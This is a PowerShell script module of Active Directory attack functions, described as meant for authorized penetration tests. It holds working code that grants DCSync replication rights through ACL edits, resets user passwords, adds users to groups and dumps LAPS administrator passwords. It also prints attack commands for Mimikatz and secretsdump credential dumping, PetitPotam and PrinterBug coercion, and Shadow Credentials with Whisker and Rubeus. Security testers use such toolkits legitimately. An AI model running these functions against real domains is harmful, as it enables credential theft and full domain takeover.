<#
.SYNOPSIS
    Active Directory attack automation scripts.
.DESCRIPTION
    PowerShell functions for common AD attacks during authorized penetration tests.
    Covers DCSync, ACL abuse, GPO abuse, LAPS, coercion, and trust exploitation.
.NOTES
    MITRE ATT&CK: T1003.006, T1222, T1484, T1187
    Context: Authorized penetration testing only.
#>

# ============================================================
# DCSync (T1003.006)
# ============================================================

function Invoke-DCSync {
    param(
        [string]$TargetUser = "krbtgt",
        [string]$Domain
    )
    <# Requires: Replicating Directory Changes + Replicating Directory Changes All #>
    if (-not $Domain) { $Domain = (Get-ADDomain).DNSRoot }
    Write-Output "[*] DCSync attack targeting $TargetUser@$Domain"
    Write-Output "[*] Use Mimikatz: lsadump::dcsync /domain:$Domain /user:$TargetUser"
    Write-Output "[*] Use Impacket: secretsdump.py $Domain/user:pass@DC_IP -just-dc-user $TargetUser"
}

function Find-DCsyncRights {
    <# Find principals with DCSync rights (DS-Replication-Get-Changes-All) #>
    $domainDN = (Get-ADDomain).DistinguishedName
    $acl = Get-Acl "AD:\$domainDN"
    $dcsyncGuid = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" # DS-Replication-Get-Changes-All

    $acl.Access | Where-Object {
        $_.ObjectType -eq $dcsyncGuid -and
        $_.AccessControlType -eq "Allow"
    } | ForEach-Object {
        [PSCustomObject]@{
            Principal      = $_.IdentityReference
            Right          = "DS-Replication-Get-Changes-All"
            AccessType     = $_.AccessControlType
            InheritedFrom  = $_.IsInherited
        }
    }
}

# ============================================================
# ACL Abuse (T1222.001)
# ============================================================

function Find-InterestingACLs {
    <# Find exploitable ACL entries on AD objects #>
    Import-Module ActiveDirectory

    $dangerousRights = @(
        "GenericAll", "GenericWrite", "WriteOwner", "WriteDacl",
        "Self", "WriteProperty", "ExtendedRight"
    )

    $users = Get-ADUser -Filter * -Properties DistinguishedName
    foreach ($user in $users) {
        $acl = Get-Acl "AD:\$($user.DistinguishedName)"
        foreach ($ace in $acl.Access) {
            if ($dangerousRights -contains $ace.ActiveDirectoryRights -and
                -not $ace.IsInherited -and
                $ace.IdentityReference -notmatch "SYSTEM|Administrators|Domain Admins|Enterprise Admins") {
                [PSCustomObject]@{
                    Target    = $user.SamAccountName
                    Principal = $ace.IdentityReference
                    Right     = $ace.ActiveDirectoryRights
                    ObjectType = $ace.ObjectType
                }
            }
        }
    }
}

function Add-UserToGroup {
    <# Exploit GenericAll/GenericWrite to add user to group #>
    param(
        [Parameter(Mandatory)][string]$Username,
        [Parameter(Mandatory)][string]$GroupName
    )
    Write-Output "[*] Adding $Username to $GroupName"
    Add-ADGroupMember -Identity $GroupName -Members $Username
    Write-Output "[+] $Username added to $GroupName"
}

function Set-UserPassword {
    <# Exploit GenericAll/ForceChangePassword to reset password #>
    param(
        [Parameter(Mandatory)][string]$Username,
        [string]$NewPassword = "P@ssw0rd123!"
    )
    Write-Output "[*] Resetting password for $Username"
    Set-ADAccountPassword -Identity $Username -Reset -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force)
    Write-Output "[+] Password reset for $Username"
}

function Add-DCsyncRights {
    <# Grant DCSync rights to a user (WriteDacl on domain object) #>
    param(
        [Parameter(Mandatory)][string]$Username
    )
    $domainDN = (Get-ADDomain).DistinguishedName
    $userSID = (Get-ADUser $Username).SID

    $replicationGuid1 = [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" # DS-Replication-Get-Changes
    $replicationGuid2 = [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" # DS-Replication-Get-Changes-All

    $acl = Get-Acl "AD:\$domainDN"
    $ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "ExtendedRight", "Allow", $replicationGuid1)
    $ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($userSID, "ExtendedRight", "Allow", $replicationGuid2)
    $acl.AddAccessRule($ace1)
    $acl.AddAccessRule($ace2)
    Set-Acl "AD:\$domainDN" $acl
    Write-Output "[+] DCSync rights granted to $Username"
}

# ============================================================
# GPO Abuse (T1484.001)
# ============================================================

function Find-WritableGPOs {
    <# Find GPOs where current user has write access #>
    $gpos = Get-GPO -All
    foreach ($gpo in $gpos) {
        $path = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies\{$($gpo.Id)}"
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        if ($acl) {
            foreach ($ace in $acl.Access) {
                if ($ace.FileSystemRights -match "Modify|FullControl|Write" -and
                    $ace.IdentityReference -notmatch "SYSTEM|Administrators|Domain Admins|Enterprise Admins") {
                    [PSCustomObject]@{
                        GPOName   = $gpo.DisplayName
                        GPOID     = $gpo.Id
                        Principal = $ace.IdentityReference
                        Rights    = $ace.FileSystemRights
                    }
                }
            }
        }
    }
}

function Find-GPOLinks {
    <# Find where a GPO is linked (which OUs, Sites, Domain) #>
    param([Parameter(Mandatory)][string]$GPOName)
    $gpo = Get-GPO -Name $GPOName
    [xml]$report = Get-GPOReport -Guid $gpo.Id -ReportType Xml
    $report.GPO.LinksTo | ForEach-Object {
        [PSCustomObject]@{
            GPO     = $GPOName
            LinkedTo = $_.SOMPath
            Enabled  = $_.Enabled
        }
    }
}

# ============================================================
# LAPS (T1552.004)
# ============================================================

function Get-LAPSPasswords {
    <# Read LAPS passwords (requires ms-Mcs-AdmPwd read rights) #>
    Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
    Where-Object { $_."ms-Mcs-AdmPwd" -ne $null } |
    Select-Object @{N='Computer';E={$_.Name}},
                  @{N='Password';E={$_."ms-Mcs-AdmPwd"}},
                  @{N='Expiration';E={[DateTime]::FromFileTime($_."ms-Mcs-AdmPwdExpirationTime")}}
}

function Find-LAPSReadRights {
    <# Find who can read LAPS passwords #>
    $computers = Get-ADComputer -Filter * -Properties DistinguishedName
    foreach ($computer in $computers) {
        $acl = Get-Acl "AD:\$($computer.DistinguishedName)"
        foreach ($ace in $acl.Access) {
            $lapsGuid = "e48fe279-3d5d-4ad1-8d6b-8a1460bdcd90" # ms-Mcs-AdmPwd property
            if ($ace.ObjectType -eq $lapsGuid -and $ace.ActiveDirectoryRights -match "ReadProperty") {
                [PSCustomObject]@{
                    Computer  = $computer.Name
                    Principal = $ace.IdentityReference
                    CanRead   = $true
                }
            }
        }
    }
}

# ============================================================
# Coercion Attacks (T1187)
# ============================================================

function Invoke-PrinterBugCheck {
    <# Check if Print Spooler is running on target (PrinterBug/SpoolSample) #>
    param([Parameter(Mandatory)][string]$Target)
    $spooler = Get-Service -ComputerName $Target -Name "Spooler" -ErrorAction SilentlyContinue
    if ($spooler -and $spooler.Status -eq "Running") {
        Write-Output "[+] Spooler service RUNNING on $Target — vulnerable to PrinterBug"
        Write-Output "    SpoolSample.exe $Target <listener>"
    } else {
        Write-Output "[-] Spooler service not running on $Target"
    }
}

function Test-PetitPotam {
    <# Check if target is vulnerable to PetitPotam (EfsRpcOpenFileRaw) #>
    param([Parameter(Mandatory)][string]$Target)
    Write-Output "[*] PetitPotam coercion check for $Target"
    Write-Output "[*] Use: python3 PetitPotam.py <listener> $Target"
    Write-Output "[*] Or: python3 PetitPotam.py -u user -p pass -d domain <listener> $Target"
}

# ============================================================
# Trust Exploitation
# ============================================================

function Get-DomainTrusts {
    <# Enumerate all domain trusts #>
    Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, IntraForest,
        SIDFilteringForestAware, SIDFilteringQuarantined, TGTDelegation |
    Format-Table -AutoSize
}

function Find-ForeignGroupMembers {
    <# Find users from trusted domains in local groups #>
    $domainSID = (Get-ADDomain).DomainSID.Value
    Get-ADGroup -Filter * -Properties Members | ForEach-Object {
        $group = $_.Name
        $_.Members | ForEach-Object {
            $member = Get-ADObject $_ -Properties objectSid
            if ($member.objectSid -and -not $member.objectSid.Value.StartsWith($domainSID)) {
                [PSCustomObject]@{
                    Group       = $group
                    ForeignUser = $member.Name
                    SID         = $member.objectSid
                }
            }
        }
    }
}

# ============================================================
# Shadow Credentials (T1556)
# ============================================================

function Find-ShadowCredentialTargets {
    <# Find objects where current user can write msDS-KeyCredentialLink #>
    Write-Output "[*] Shadow Credentials attack targets:"
    Write-Output "[*] Requires GenericWrite or write to msDS-KeyCredentialLink"
    Write-Output "[*] Tool: Whisker.exe add /target:targetcomputer$"
    Write-Output "[*] Then: Rubeus.exe asktgt /user:targetcomputer$ /certificate:<pfx> /password:<pass> /ptt"
}

Write-Output @"
[*] AD Attack Functions Loaded:

  DCSync:
    Invoke-DCSync                  # DCSync attack commands
    Find-DCsyncRights              # Find DCSync-capable principals

  ACL Abuse:
    Find-InterestingACLs           # Scan for exploitable ACLs
    Add-UserToGroup                # GenericAll → add to group
    Set-UserPassword               # GenericAll → reset password
    Add-DCsyncRights               # WriteDacl → grant DCSync

  GPO Abuse:
    Find-WritableGPOs              # Find writable GPOs
    Find-GPOLinks                  # Show where GPO is linked

  LAPS:
    Get-LAPSPasswords              # Read LAPS passwords
    Find-LAPSReadRights            # Who can read LAPS passwords

  Coercion:
    Invoke-PrinterBugCheck         # Check Spooler for PrinterBug
    Test-PetitPotam                # PetitPotam coercion check

  Trusts:
    Get-DomainTrusts               # Enumerate domain trusts
    Find-ForeignGroupMembers       # Foreign members in local groups

  Shadow Credentials:
    Find-ShadowCredentialTargets   # Shadow Credential attack info
"@
